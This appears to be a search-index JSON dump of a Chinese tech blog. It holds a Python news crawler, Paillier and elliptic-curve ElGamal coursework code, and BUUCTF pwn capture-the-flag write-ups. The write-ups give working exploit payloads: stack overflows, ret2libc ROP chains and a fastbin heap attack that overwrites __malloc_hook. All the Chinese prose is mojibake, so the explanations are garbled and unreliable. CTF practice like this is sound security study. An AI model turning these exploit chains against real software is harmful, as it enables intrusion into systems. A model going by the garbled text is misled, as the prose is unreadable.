soup.find('div').string[5:] print(s) visit.append(int(s)) time.append(date[10:]) def iterNews(news_list, r): date_regex = r'.*2019-.*' for news in news_list: date = getDate(news) if re.match(date_regex, date): article_url = getArticleURL(news) if not article_url.startswith('http'): soup = BeautifulSoup(r.get(getVisitCountURL(article_url),headers=headers).text,'lxml', parse_only=only_detail) try: fillTable(soup, date) except: pass def export2Excel(): import pandas as pd writer = pd.ExcelWriter('output.xlsx') df = pd.DataFrame(data={'time':time,'visit':visit}) df.to_excel(writer,'Sheet1', index=False) writer.save() def crawl(): r = requests.Session() r.get(base_url +'/htmlaction.do?method=toIndex') for i in range(max_page): soup = BeautifulSoup(r.get(page2url(i),headers=headers).text, 'lxml', parse_only=only_news) news_list = getNewsList(soup) iterNews(news_list, r) if __name__ == \"__main__\": crawl() export2Excel() ","date":"2020-01-22","objectID":"/newspaper/:5:0","tags":["Python","çˆ¬è™«","é¡¹ç›®"],"title":"ä¸œæ–¹è®°è€…ï¼šæ–°é—»ç»Ÿè®¡å°å·¥å…· Newspaper","uri":"/newspaper/"},{"categories":["å¯†ç å­¦"],"content":"æœ€åä¸€æ¬¡æŠ½ä»£è¯¾çš„ä¸Šæœºç»ƒä¹ ã€‚ ","date":"2019-12-26","objectID":"/paillier/:0:0","tags":["å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"Paillier åŒæ€åŠ å¯†æ–¹æ¡ˆå®ç°","uri":"/paillier/"},{"categories":["å¯†ç å­¦"],"content":"æ–¹æ¡ˆä»‹ç» è¯¦è§ wikiã€‚ ","date":"2019-12-26","objectID":"/paillier/:1:0","tags":["å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"Paillier åŒæ€åŠ å¯†æ–¹æ¡ˆå®ç°","uri":"/paillier/"},{"categories":["å¯†ç å­¦"],"content":"ç»ƒä¹ å†…å®¹ æˆ‘å¿˜è®°äº†â€¦â€¦å‡­å€Ÿä»£ç æƒ³èµ·æ¥ä¸€ç‚¹ï¼š ç”Ÿæˆ 10bit çš„å¤§ç´ æ•° p,qï¼Œè¾“å‡ºå…¬é’¥ä¸ç§é’¥ã€‚ ä»¤æ˜æ–‡ m1 = 15, m2 = 20ï¼Œè¾“å‡ºåŠ å¯†åçš„å¯†æ–‡ c1, c2ã€‚ å¯¹å¯†æ–‡ c1, c2 è§£å¯†ï¼Œè¾“å‡ºè§£å¯†ç»“æœ m1', m2'ã€‚ å¯¹ c1 * c2 è§£å¯†ï¼Œè¾“å‡ºè§£å¯†ç»“æœ m'ï¼Œä»¥éªŒè¯ m' = m1'+ m2'ã€‚ æœ€åä¸€æ­¥å°±æ˜¯éªŒè¯è¯¥æ–¹æ¡ˆæ˜¯ä¸€ç§åŒæ€åŠ å¯†æ–¹æ¡ˆã€‚ ","date":"2019-12-26","objectID":"/paillier/:2:0","tags":["å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"Paillier åŒæ€åŠ å¯†æ–¹æ¡ˆå®ç°","uri":"/paillier/"},{"categories":["å¯†ç å­¦"],"content":"ä»£ç  ç”Ÿæˆ 10bit å¤§ç´ æ•°å·äº†ä¸ªæ‡’ã€‚å‰©ä½™çš„è¿‡ç¨‹ä¸»è¦å‚è€ƒäº†ç»´åŸºä¸Šçš„æ–¹æ³•ï¼Œä¾æ—§ç¦»ä¸å¼€ç†Ÿæ‚‰çš„å¿«é€Ÿå¹‚ã€æ‰©å±•æ¬§å‡ é‡Œå¾—ã€æ±‚é€†å…ƒä¸‰å¤§ç®—æ³•ã€‚ from Crypto.Util import number import math import random # constants n_length = 10 p = number.getPrime(n_length) q = number.getPrime(n_length) n = p*q n2 = n**2 m1 = 15 m2 = 20 # general funcs def L(x): global n return (x-1) // n def lcm(a,b): return abs(a*b) // math.gcd(a,b) def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) def modinv(a, m): g, x, y = egcd(a, m) if g != 1: #raise Exception('Modular inverse does not exist') return -1 else: return x % m def quick_pow(a, b, p): ret = 1 a %= p while b: if b\u00261: ret = (ret * a) % p b \u003e\u003e= 1 a = (a * a) % p return ret random.seed() lamb = lcm(p-1, q-1) mu = -1 while mu == -1: g = random.randint(0, n2-1) mu = modinv(L(quick_pow(g,lamb,n2)), n) print('PubKey: (n={},g={})'.format(n,g)) print('PrivKey: (lambda={},p={},q={})'.format(lamb,p,q)) print('mu: {}'.format(mu)) r1 = random.randint(0,n-1) r2 = random.randint(0,n-1) c1 = quick_pow(g,m1,n2) * quick_pow(r1,n,n2) % n2 c2 = quick_pow(g,m2,n2) * quick_pow(r2,n,n2) % n2 print('c1: {}'.format(c1)) print('c2: {}'.format(c2)) m1_ = L(quick_pow(c1,lamb,n2)) * mu % n m2_ = L(quick_pow(c2,lamb,n2)) * mu % n print(\"m1': {}\".format(m1_)) print(\"m2': {}\".format(m2_)) m_ = L(quick_pow(c1*c2,lamb,n2)) * mu % n print(\"m': {}\".format(m_)) ","date":"2019-12-26","objectID":"/paillier/:3:0","tags":["å…¬é’¥å¯†ç å­¦","åŒæ€åŠ å¯†"],"title":"Paillier åŒæ€åŠ å¯†æ–¹æ¡ˆå®ç°","uri":"/paillier/"},{"categories":["å¯†ç å­¦"],"content":"æŠ½ä»£è¯¾çš„ä¸Šæœºç»ƒä¹ ã€‚ ","date":"2019-12-20","objectID":"/elgamal-ecc/:0:0","tags":["å…¬é’¥å¯†ç å­¦"],"title":"ElGamal å¯†ç æ–¹æ¡ˆçš„æ¤­åœ†æ›²çº¿å½¢å¼å®ç°","uri":"/elgamal-ecc/"},{"categories":["å¯†ç å­¦"],"content":"æ–¹æ¡ˆç®€è¿° è®¾ $E$ ä¸º $F_q$ ä¸Šçš„æ¤­åœ†æ›²çº¿ï¼Œä¸€èˆ¬è®°ä¸º $E(F_q)$ï¼Œè®¾ $P=(x_p,y_p)\\in E(F_q)$ï¼Œä¸” $P$ çš„æ¬¡æ•°è¶³å¤Ÿå¤§ï¼Œ ä»»å– $1\u003cs\u003cord(P)$ï¼Œä»¤ $Q=(x_q,y_q)=sP$ï¼Œåˆ™ $(E(F_q),P,Q)$ ä¸ºå…¬é’¥ï¼Œ$s$ ä¸ºç§é’¥ã€‚ æ¶ˆæ¯ $m$ æ»¡è¶³ $0\\leq m\u003cF_q$ï¼Œä»»å– $1\u003cr\u003cF_q$ï¼Œè®¡ç®— $(x_1,y_1)=ğ‘Ÿğ‘ƒ,(x_2,y_2)=rQ,c=m\\cdot x_2$ï¼Œ åˆ™å¯†æ–‡ä¸º $(x_1,y_1,c)$ã€‚ è§£å¯†æ—¶ï¼Œè®¡ç®— $(xâ€™,yâ€™)=s(x_1,y_1)$ï¼Œå†è®¡ç®— $mâ€™=c\\cdot xâ€™^{-1}$ï¼Œè§£å¾—æ˜æ–‡ã€‚ ","date":"2019-12-20","objectID":"/elgamal-ecc/:1:0","tags":["å…¬é’¥å¯†ç å­¦"],"title":"ElGamal å¯†ç æ–¹æ¡ˆçš„æ¤­åœ†æ›²çº¿å½¢å¼å®ç°","uri":"/elgamal-ecc/"},{"categories":["å¯†ç å­¦"],"content":"æ­£ç¡®æ€§è¯æ˜ å› ä¸º $(xâ€™,yâ€™)=s(x_1,y_1)=srP=rsP=rQ=(x_2,y_2)$ï¼Œæ‰€ä»¥ $xâ€™=x_2$ï¼Œ å› æ­¤ $mâ€™=c\\cdot xâ€™^{-1}=c\\cdot x_2^{-1}=m$ï¼Œå¾—è¯ã€‚ æ–¹æ¡ˆçš„å®‰å…¨æ€§ä¾èµ–äºæ¤­åœ†æ›²çº¿ä¸Šçš„ç¦»æ•£å¯¹æ•°é—®é¢˜ã€‚ ","date":"2019-12-20","objectID":"/elgamal-ecc/:2:0","tags":["å…¬é’¥å¯†ç å­¦"],"title":"ElGamal å¯†ç æ–¹æ¡ˆçš„æ¤­åœ†æ›²çº¿å½¢å¼å®ç°","uri":"/elgamal-ecc/"},{"categories":["å¯†ç å­¦"],"content":"ç»ƒä¹ å†…å®¹ ä»¤ $E:y^2=x^3+x+6$ ä¸º $F_{11}$ ä¸Šçš„ä¸€æ¡æ¤­åœ†æ›²çº¿ï¼Œæ±‚ $E$ ä¸Šçš„æ‰€æœ‰ç‚¹ ä»¤ $P=(2,7)$ï¼Œå– $s=5$ï¼Œæ±‚å…¬é’¥ è®¾æ¶ˆæ¯ $m=3$ï¼Œå– $r=7$ï¼Œæ±‚ $m$ çš„å¯†æ–‡ $(x_1,y_1,c)$ å¯¹ $(x_1,y_1,c)$ åšè§£å¯†è¿ç®—ï¼Œæ±‚ $(xâ€™,yâ€™)$ï¼Œå¹¶è¿›ä¸€æ­¥æ±‚å…¶æ˜æ–‡ $m'$ ","date":"2019-12-20","objectID":"/elgamal-ecc/:3:0","tags":["å…¬é’¥å¯†ç å­¦"],"title":"ElGamal å¯†ç æ–¹æ¡ˆçš„æ¤­åœ†æ›²çº¿å½¢å¼å®ç°","uri":"/elgamal-ecc/"},{"categories":["å¯†ç å­¦"],"content":"ä»£ç  $F_{11}$ æ¯”è¾ƒå°å°±ç›´æ¥ç¡¬ç¼–ç äº†ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ æ¨¡ p å¹³æ–¹æ ¹ç®—æ³• æ¥æ±‚è§£äºŒæ¬¡å‰©ä½™å¯¹åº”çš„å¹³æ–¹æ ¹ã€‚ éœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ä¸è¦å¯¹è´Ÿæ•°æ±‚é€†å…ƒï¼Œå› æ­¤åšå‡æ³•æ—¶å¯ä»¥é¢å¤–åŠ ä¸€ä¸ª +pã€‚ # general funcs def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('Modular inverse does not exist') else: return x % m # constants p = 11 a,b,c,d = 1,0,1,6 # y^2 = ax^3 + bx^2 + cx + d sqrt = [-1,1,-1,5,2,4,-1,-1,-1,3,-1] def E(x): return (a*x**3 + b*x**2 + c*x + d) % p # dy/dx def dE(x, y): return (3*a*x**2 + 2*b*x + c) * modinv(2*y, p) def add(P, Q): x1,y1,x2,y2 = P[0],P[1],Q[0],Q[1] if x1==x2 and y1==y2: K = dE(x1,y1) else: K = (y2-y1) * modinv(x2-x1+p, p) x0 = (K**2 - x1 - x2) % p y0 = (K * (x1 - x0) - y1) % p return (x0, y0) def mul(P, x): Q = P for i in range(x-1): Q = add(Q, P) return Q def init(): for i in range(p): y2 = E(i) print('x={}, y^2={}'.format(i, y2), end='') if sqrt[y2] != -1: print((i, sqrt[y2]), (i, p-sqrt[y2])) else: print() init() P = (2,7) s = 5 Q = mul(P,s) # Q = sP Estr = '{}x^3 + {}x^2 + {}x + {}'.format(a,b,c,d) print('Pubkey: ({},{},{})'.format(Estr,P,Q)) m = 3 r = 7 c1 = mul(P,r) # (x1,y1) c2 = mul(Q,r) # (x2,y2) C = m * c2[0] % p print('Ciphertext: {}'.format(c1+(C,))) # (x1,y1,C) C_ = mul(c1,s) # (x',y') print(\"(x',y'): {}\".format(C_)) m_ = C * modinv(C_[0],p) % p # C * (x')^(-1) print('Plaintext: {}'.format(m_)) ","date":"2019-12-20","objectID":"/elgamal-ecc/:4:0","tags":["å…¬é’¥å¯†ç å­¦"],"title":"ElGamal å¯†ç æ–¹æ¡ˆçš„æ¤­åœ†æ›²çº¿å½¢å¼å®ç°","uri":"/elgamal-ecc/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ä»ä»Šå¤©èµ·ï¼Œæˆ‘ä¹Ÿæ˜¯ Pwn ğŸ• äº†ã€‚ ","date":"2019-12-14","objectID":"/buu-pwn/:0:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"Part I ","date":"2019-12-14","objectID":"/buu-pwn/:1:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"test_your_nc nc ç›´æ¥è¿ï¼Œcat flagã€‚ ","date":"2019-12-14","objectID":"/buu-pwn/:1:1","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"rip æ ˆæº¢å‡ºï¼Œå¯ç›´æ¥è¦†ç›–è¿”å›åœ°å€ï¼Œæ³¨æ„ 64 ä½ï¼š payload = 'a'*(0xf+8) + p64(elf.symbols['fun']) s(payload) ","date":"2019-12-14","objectID":"/buu-pwn/:1:2","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"warmup_csaw_2016 å’Œä¸Šé¢˜å…¶å®ä¸€æ ·ï¼Œç¨‹åºä¸­å­˜åœ¨åé—¨ï¼Œç›´æ¥è¿”å›è¿‡å»ã€‚ payload = 'a'*(0x40+8) + p64(0x40060d) s(payload) ","date":"2019-12-14","objectID":"/buu-pwn/:1:3","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"pwn1_sctf_2016 ç›´æ¥è¿è¡Œå‡ æ¬¡æˆ–è€…æºç å®¡è®¡å¯ä»¥å‘ç°æ˜¯å°†è¾“å…¥çš„ I æ›¿æ¢ä¸º youï¼Œå…¶ä½™çš„å…¶å®å’Œä¸Šé¢ä¸€æ ·ï¼š payload = 'I'*(0x3c // 3)+'a'*4+p32(elf.symbols['get_flag']) sl(payload) ","date":"2019-12-14","objectID":"/buu-pwn/:1:4","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ciscn_2019_c_1 å¼€å¯äº† NX ä¿æŠ¤ï¼Œå¹¶ä¸”æœ‰æœªé™åˆ¶é•¿åº¦çš„ getsï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šæ˜¯ ROP æ ˆæº¢å‡ºã€‚IDA æœä¸€ä¸‹ stringï¼Œå¯ä»¥å‘ç°æœ‰ libc å¯ä»¥ç”¨ï¼Œè€ƒè™‘ ret2libcã€‚ pop_rdi = 0x400c83 def send(payload): ru('!\\n') sl('1') ru('ed\\n') sl(payload) payload = flat('a'*0x58,pop_rdi,elf.got['__libc_start_main'],elf.plt['puts'],elf.sym['main']) send(payload) ru('@\\n') leak = uu64(r(6)) system,binsh = ret2libc(leak,'__libc_start_main') payload = flat('a'*0x58,pop_rdi,binsh,system) send(payload) ","date":"2019-12-14","objectID":"/buu-pwn/:1:5","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ciscn_2019_n_1 ä¾ç„¶æ˜¯æœ€ç®€å•çš„æ— ä¿æŠ¤ gets å¹¶ä¸”ç¨‹åºä¸­æœ‰ system(\"cat /flag\")ï¼Œæ‰¾åˆ°åè€…åœ°å€è¿”å›è¿‡å»å³å¯ã€‚ cat_flag = 0x4006be def send(payload): ru('number.\\n') sl(payload) payload = flat('a'*0x38, cat_flag) send(payload) ","date":"2019-12-14","objectID":"/buu-pwn/:1:6","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ciscn_2019_en_2 å’Œä¸Šä¸Šé¢˜ä¸€æ ·ã€‚ ","date":"2019-12-14","objectID":"/buu-pwn/:1:7","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"Part II ","date":"2019-12-14","objectID":"/buu-pwn/:2:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"[OGeek2019]babyrop int __cdecl main() { int buf; // [esp+4h] [ebp-14h] char v2; // [esp+Bh] [ebp-Dh] int fd; // [esp+Ch] [ebp-Ch] sub_80486BB(); fd = open(\"/dev/urandom\", 0); if (fd\u003e 0 ) read(fd, \u0026buf, 4u); v2 = sub_804871F(buf); sub_80487D0(v2); return 0; } main ä¸­ sub_80486BB ç”¨äºåˆå§‹åŒ–ï¼Œç„¶åå°†ä¸€ä¸ªéšæœºæ•°ä¼ å…¥ sub_804871Fï¼š int __cdecl sub_804871F(int a1) { size_t v1; // eax char s; // [esp+Ch] [ebp-4Ch] char buf[7]; // [esp+2Ch] [ebp-2Ch] unsigned __int8 v5; // [esp+33h] [ebp-25h] ssize_t v6; // [esp+4Ch] [ebp-Ch] memset(\u0026s, 0, 0x20u); memset(buf, 0, 0x20u); sprintf(\u0026s,\"%ld\", a1); v6 = read(0, buf, 0x20u); buf[v6 - 1] = 0; v1 = strlen(buf); if (strncmp(buf, \u0026s, v1) ) exit(0); write(1,\"Correct\\n\", 8u); return v5; } è¿™é‡Œçš„ a1 å°±æ˜¯ä¼ å…¥çš„éšæœºæ•°ï¼Œç„¶åè¦æ±‚æˆ‘ä»¬çš„è¾“å…¥å’Œéšæœºæ•°ç»è¿‡ strncmp æ¯”è¾ƒåå®Œå…¨ç›¸åŒï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥ \\x00 ä½¿å¾— strlen å‡½æ•°è¿”å› 0ï¼Œä»è€Œä½¿å¾— strncmp å‡½æ•°åªæ¯”è¾ƒ 0 ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå°±èƒ½ç»•è¿‡è¿™é‡Œçš„ exit(0)ï¼Œå¹¶è¿”å› v5ã€‚æ³¨æ„åˆ°è¿™é‡Œçš„è¿”å›å€¼ v5 åœ¨ ebp-0x25ï¼Œè·ç¦»æˆ‘ä»¬èƒ½æ§åˆ¶çš„ä½äº ebp-0x2c çš„å˜é‡ buf ç›¸å·® 0x7ï¼Œå°äºè¿™é‡Œ read çš„é•¿åº¦é™åˆ¶ 0x20ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ§åˆ¶ v5 çš„å€¼ï¼Œä»è€Œæ§åˆ¶ main ä¸­çš„ v2ã€‚ éšåï¼Œv2 ä¼šè¢«ä¼ å…¥ sub_80487D0: ssize_t __cdecl sub_80487D0(char a1) { ssize_t result; // eax char buf; // [esp+11h] [ebp-E7h] if (a1 == 127) result = read(0, \u0026buf, 0xC8u); else result = read(0, \u0026buf, a1); return result; } a1 å°±æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ v2ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œå¯ä»¥å‘ buf å†™å…¥çš„æ•°æ®é•¿åº¦ä¹Ÿæ˜¯æˆ‘ä»¬èƒ½æ§åˆ¶çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¸Œæœ›å®ƒå°½å¯èƒ½å¤§ï¼Œä¹Ÿå°±æ˜¯ç­‰äº 0xffã€‚é‚£ä¹ˆåœ¨ä¸Šä¸€ä¸ªå‡½æ•°ä¸­æˆ‘ä»¬å°±éœ€è¦ä»¤ v5 ä¸º 0xffï¼Œç»“åˆä¸Šé¢çš„ç»•è¿‡ï¼Œå¯ä»¥è¾“å…¥ '\\x00' + 6*'a' + '\\xff' æ¥è¾¾åˆ°è¿™ä¸ªç›®çš„ã€‚æœ€å ret2libc å³å¯ã€‚ def send1(): payload = flat('\\x00','a'*6,'\\xff') sl(payload) ru('Correct\\n') send1() main = 0x8048825 payload = flat('a'*(0xe7+4),elf.plt['write'],main,1,elf.got['__libc_start_main'],4) sl(payload) leak = u32(r(4)) system,binsh = ret2libc(leak,'__libc_start_main') send1() payload = flat('a'*(0xe7+4),system,'a'*4,binsh) p.sendline(payload) ","date":"2019-12-14","objectID":"/buu-pwn/:2:1","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"babyheap_0ctf_2017 ===== Baby Heap in 2017 ===== 1. Allocate 2. Fill 3. Free 4. Dump 5. Exit åˆ†é…å†…å­˜ä½¿ç”¨äº† callocï¼Œæ¯æ¬¡åˆ†é…ä¼šå…ˆæ¸…ç©ºä¸€ä¸‹è¿™å—å†…å­˜ï¼Œå¤§å°é™åˆ¶æ˜¯ 4096Bã€‚å¡«å……æ—¶ç›´æ¥è¯»å–ç”¨æˆ·è¾“å…¥ï¼Œæ²¡æœ‰æ£€æŸ¥é•¿åº¦ï¼Œå› æ­¤å¯ä»¥å †æº¢å‡ºã€‚é™¤äº† canary å¤–ä¿æŠ¤å…¨å¼€ï¼Œå› æ­¤è€ƒè™‘æ³„éœ² libcã€‚å¦‚ä½•æ³„éœ²ï¼Ÿ å½“åªæœ‰ä¸€ä¸ª small bin/large bin è¢«é‡Šæ”¾æ—¶ï¼Œå…¶ fd ä¸ bk æŒ‡å‘ main_arena ä¸­çš„åœ°å€ï¼Œè€Œåè€…æ˜¯ libc çš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å®ƒæ³„éœ²å‡º libc åŸºå€ã€‚ é¦–å…ˆåˆ†é… 4 ä¸ª fast chunk å’Œ 1 ä¸ª small chunkï¼ˆä¸å¦¨åˆ†åˆ«ç§°ä¸º a,b,c,d,eï¼‰ï¼Œç„¶åé‡Šæ”¾ bï¼Œå®ƒå°†è¢«åŠ å…¥ fast bin é¡¶éƒ¨ã€‚æ­¤æ—¶å†é‡Šæ”¾ cï¼Œé‚£ä¹ˆ c ä¹Ÿä¼šåŠ å…¥ fast bin é¡¶éƒ¨ï¼Œå¹¶ä¸”å®ƒçš„ fd æŒ‡å‘ bã€‚æ­¤æ—¶æœ‰ï¼šfreelist-\u003ec-\u003ebã€‚ for i in range(4): alloc(0x10) # a0,b1,c2,d3 alloc(0x80) # e4 free(1) # b free(2) # c è¿™æ ·å°±å¯ä»¥è¿›è¡Œ fastbin attackã€‚åˆ©ç”¨ Fill å †æº¢å‡ºä¿®æ”¹ c çš„ fd ä¸º e çš„åœ°å€ï¼ˆæˆ‘ä»¬éœ€è¦ä»æœªè¢«é‡Šæ”¾çš„ a å¼€å§‹å¡«å……ï¼Œæ‰€ä»¥åˆšæ‰ä¸æ˜¯ä» a å¼€å§‹é‡Šæ”¾ï¼‰ï¼Œéšåç¬¬ä¸€æ¬¡ Allocate æ‹¿åˆ° cï¼Œç¬¬äºŒæ¬¡ Allocate å°±èƒ½æ‹¿åˆ° eã€‚ # c-\u003efd = e payload = flat([0,0,0,0x21,0,0,0,0x21,'\\x80']) fill(0, payload) æ³¨æ„è¿™é‡Œ payload çš„å‰ä¸‰ä¸ª 0 ç”¨äºå¡«å…… a ä¸­ 0x10 å­—èŠ‚çš„ç”¨æˆ·æ•°æ®å’Œ b ä¸­ 0x8 å­—èŠ‚çš„ prev_size å­—æ®µï¼Œåé¢åŒç†ã€‚0x21 æ˜¯ a/b/c/d çš„ chunk_sizeï¼Œ0x80 æ˜¯ e çš„åœ°å€ä½ 8 ä½ï¼Œéƒ½å¯ä»¥é€šè¿‡ gdb è°ƒè¯•å¾—åˆ°ã€‚ æ³¨ï¼š0x21 ä½ä½çš„ 1 è¡¨ç¤º PREV_INUSEï¼Œè¿™å’Œ fast bin ä¸­ chunk çš„ P ä½ä¸å˜æ˜¯ä¸€è‡´çš„ã€‚ ç„¶è€Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªå®‰å…¨æ£€æŸ¥ï¼š #define fastbin_index(sz) \\ ((((unsigned int) (sz)) \u003e\u003e (SIZE_SZ == 8 ? 4 : 3)) - 2) if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL; } æ£€æŸ¥æˆ‘ä»¬æ‹¿åˆ°çš„ chunk çš„å¤§å°æ˜¯å¦åœ¨å¯¹åº”ç´¢å¼•çš„ fast bin èŒƒå›´å†…ã€‚æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¿®æ”¹ e çš„ chunk_size å­—æ®µï¼Œæ–¹æ³•åŒæ ·æ˜¯å †æº¢å‡ºã€‚ # e-\u003echunk_size = 0x21 payload = flat([0,0,0,0x21]) fill(3, payload) è¿™é‡Œé€šè¿‡ d æº¢å‡ºåˆ° e çš„ chunk_size å¹¶è¦†ç›–ä¸Šäº† 0x21ï¼Œgdb è°ƒè¯•å¾—åˆ°å…¶ç´¢å¼•ä¸º 2ã€‚ ä¿®æ”¹å®Œæˆåæ‰å¯ä»¥è¿›è¡Œä¸¤æ¬¡ alloc(0x10) ä»è€Œæ‹¿åˆ° eã€‚æ‹¿åˆ° e åå†é‡Šæ”¾æ‰å®ƒå°±å¯ä»¥è·å¾—å…¶ fd ä¸ bkï¼Œä½†è¿™é‡Œæœ‰ä¸¤ä¸ªé—®é¢˜ï¼š å‰é¢å¯¹å…¶ chunk_size çš„ä¿®æ”¹ä¼šå¯¼è‡´é‡Šæ”¾æ—¶ e è¿›å…¥ fast binï¼Œæ‹¿ä¸åˆ° fd å’Œ bkã€‚ e è¢«é‡Šæ”¾åä¸ top chunk ç›¸é‚»ï¼Œå¿…å®šä¼šè¢«åˆå¹¶ã€‚ fd å’Œ bk åˆ°åº•æŒ‡å‘å“ªé‡Œï¼Ÿ è§£ç­”ï¼š æŠŠ e çš„ chunk_size æ¢å¤å³å¯ã€‚ é‡Šæ”¾ e å‰å†å¤šç”³è¯·ä¸€ä¸ª small chunk ä½¿å¾— e ä¸ä¸ top chunk ç›¸é‚»ã€‚ e è¢«é‡Šæ”¾åè¿›å…¥ unsorted binï¼Œæ‰€ä»¥å…¶ fd ä¸ bk éƒ½æŒ‡å‘ unsorted bin çš„é“¾è¡¨å¤´ï¼Œæ³¨æ„å…¶åœ°å€åˆ° libc åŸºå€çš„åç§»æ˜¯å›ºå®šçš„ 0x3c4b78ã€‚ # e-\u003echunk_size = 0x91 payload = flat([0,0,0,0x91]) fill(3, payload) alloc(0x80) # f5 free(4) # e, e-\u003efd = unsorted_head base = u64(dump(2)[:8])-0x3c4b78 æœ€åçš„ dump(2) å°±æ˜¯æ‰“å°ç´¢å¼•ä¸º 2 çš„ chunkï¼Œä¹Ÿå°±æ˜¯ eï¼Œä»è€Œå¾—åˆ° e çš„ fd å’Œ bkã€‚ ä¹‹åï¼Œå†æ¬¡ä½¿ç”¨ fast bin attack å°† libc ä¸­å‡½æ•°ï¼Œä¾‹å¦‚ __malloc_hook æ”¾å…¥ fast binï¼Œç„¶åç”¨ malloc è¿”å›ç»™æˆ‘ä»¬ï¼Œå°±å¯ä»¥å®ç°ç±»ä¼¼ GOT åŠ«æŒçš„æ•ˆæœã€‚__malloc_hook åªè¦éç©ºï¼Œå°±ä¼šåœ¨ malloc æ—¶è¢«è°ƒç”¨ï¼Œæˆ‘ä»¬è®©å®ƒæŒ‡å‘ one_gadget æ‰¾åˆ°çš„ä¸€ä¸ª gadget å³å¯ï¼Œæ¯”å¦‚å¯ä»¥ç”¨è·ç¦» libc åŸºå€ 0x4526a çš„ gadgetã€‚ ä½†æ˜¯åŒæ ·çš„ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡ä¸Šé¢çš„å®‰å…¨æ£€æŸ¥ã€‚å¹¸è¿çš„æ˜¯ï¼Œè¯¥æ£€æŸ¥å¯¹äºå¯¹é½æ²¡æœ‰ä»»ä½•è¦æ±‚ã€‚é€šè¿‡ gdb è°ƒè¯•æˆ‘ä»¬å‘ç°åœ¨ __malloc_hook é™„è¿‘çš„ _IO_wide_data_0+304 ä½ç½®å…¶é«˜ä½å­—èŠ‚ä¸º 7f è€Œä½ä½å­—èŠ‚å«æœ‰è¿ç»­çš„ 00ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å¢åŠ ä¸€äº›åç§»è·å¾— 0x7f è¿™ä¸ªæ•°å€¼ä½œä¸º chunk_sizeï¼Œæ°å¥½èƒ½é€šè¿‡æ£€æŸ¥ã€‚ å¦‚ä¸‹ï¼š pwndbg\u003e x/32xg (long long)(\u0026main_arena)-0x40 0x7f16d95deae0 \u003c_IO_wide_data_0+288\u003e: 0x0000000000000000 0x0000000000000000 0x7f16d95deaf0 \u003c_IO_wide_data_0+304\u003e: 0x00007f16d95dd260 0x0000000000000000 0x7f16d95deb00 